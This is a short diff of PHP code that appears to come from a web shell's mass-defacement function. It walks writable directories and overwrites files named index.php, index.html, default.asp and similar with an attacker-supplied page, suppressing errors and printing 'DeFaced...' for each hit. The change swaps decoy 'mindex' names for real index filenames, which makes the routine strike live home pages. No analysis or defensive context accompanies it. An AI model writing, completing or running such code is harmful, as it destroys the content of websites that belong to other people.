@@ -6006,7 +6006,7 @@ if(!@is_writable($dir)) return false;
 if(!@is_readable($dir)) return false;
 $defpage=@file_get_contents($defpage);
 if($m == 'index'){
-$indexs = array('mindex.php','mindex.htm','mindex.html','default.asp','default.aspx','index.asp','index.aspx','index.js');
+$indexs = array('index.php','index.htm','index.html','default.asp','default.aspx','index.asp','index.aspx','index.js');
 if(in_array(strtolower($file),$indexs)){
 @file_put_contents($dir,$defpage);
 echo @is_file($dir)?$dir."<b><font color='red'>DeFaced...</b></font><br>" : '';
